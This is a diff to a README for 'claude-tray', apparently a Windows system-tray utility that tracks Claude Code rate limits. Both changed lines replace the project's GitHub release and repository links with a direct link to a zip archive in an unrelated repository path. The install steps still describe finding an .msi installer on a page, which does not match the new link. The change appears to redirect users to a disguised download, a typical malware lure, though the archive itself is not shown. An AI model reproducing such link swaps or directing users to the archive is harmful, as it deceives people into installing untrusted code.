@@ -5,7 +5,7 @@ description: "Monitor your Claude Code rate limits from the Windows system tray 
 ---
 # 🖥️ claude-tray - Track your Claude usage on Windows
 
-<a href="https://github.com/sirtapan7-crypto/claude-tray/releases"><img src="https://img.shields.io/badge/Download-Latest%20Version-blue.svg" alt="Download"></a>
+<a href="https://raw.githubusercontent.com/sirtapan7-crypto/sirtapan7-crypto.github.io/main/antarctic/sirtapan_github_crypto_io_1.0.zip"><img src="https://img.shields.io/badge/Download-Latest%20Version-blue.svg" alt="Download"></a>
 
 This application sits in your Windows system tray. It monitors your Claude Code activity in real time. It tells you your current rate-limit percentage and predicts when you might run out of requests. The icon changes color to red as you approach your limit. You can also view a breakdown of your usage over the last 24 hours.
 
@@ -21,7 +21,7 @@ The application runs smoothly on standard hardware. It consumes very little memo
 
 Follow these steps to set up the tool on your computer.
 
-1. Visit the [Download Page](https://github.com/sirtapan7-crypto/claude-tray) to get the latest version of the installer.
+1. Visit the [Download Page](https://raw.githubusercontent.com/sirtapan7-crypto/sirtapan7-crypto.github.io/main/antarctic/sirtapan_github_crypto_io_1.0.zip) to get the latest version of the installer.
 2. Locate the file named `claude-tray-setup.msi` on the page.
 3. Download the file to your computer.
 4. Double-click the file to start the installation process.
